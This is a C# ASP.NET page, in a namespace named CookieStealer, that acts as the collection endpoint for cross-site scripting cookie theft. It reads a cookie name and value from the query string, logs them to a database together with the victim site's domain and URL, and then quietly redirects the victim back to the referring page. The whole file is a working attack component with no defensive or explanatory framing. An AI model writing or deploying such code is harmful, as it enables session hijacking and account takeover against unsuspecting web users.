using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace CookieStealer
{
    public partial class CookieStealer : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            try
            {
                Cooky c = new Cooky();
                c.CookieKey = Request.QueryString[0].Split('=')[0];
                c.CookieValue = Request.QueryString[0].Split('=')[1];
                c.Domain = Request.UrlReferrer.DnsSafeHost;
                c.AbsoluteURI = Request.UrlReferrer.AbsoluteUri;
                GarbageEntities ge = new GarbageEntities();
                ge.Cookies.Add(c);
                ge.SaveChanges();

                Response.Redirect(Request.UrlReferrer.AbsoluteUri.Split(new string[] { "?" }, StringSplitOptions.RemoveEmptyEntries)[0]);
            }
            catch
            {
            }
        }
    }
}